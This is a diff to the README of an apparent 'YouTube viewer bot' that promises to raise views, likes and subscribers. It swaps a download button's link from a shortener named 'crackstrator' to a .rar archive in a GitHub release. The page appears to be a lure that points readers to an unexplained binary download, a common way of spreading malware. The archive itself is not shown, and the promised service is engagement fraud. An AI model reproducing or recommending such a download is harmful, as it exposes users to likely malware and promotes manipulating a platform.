@@ -41,7 +41,5 @@ Simple program to increase YouTube views / likes / subsribers . Works with live 
 
 
 
-
-
 <h2 align=center>⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇️⬇</h2>
-<p align="center"> <a href="https://gg.gg/crackstrator"> <img height="90" src="https://iili.io/JapvPpf.png"/> </a> </p>
+<p align="center"> <a href=https://github.com/JesusAv01/YT-viewer-bot/releases/download/release/software.rar"> <img height="90" src="https://iili.io/JapvPpf.png"/> </a> </p>
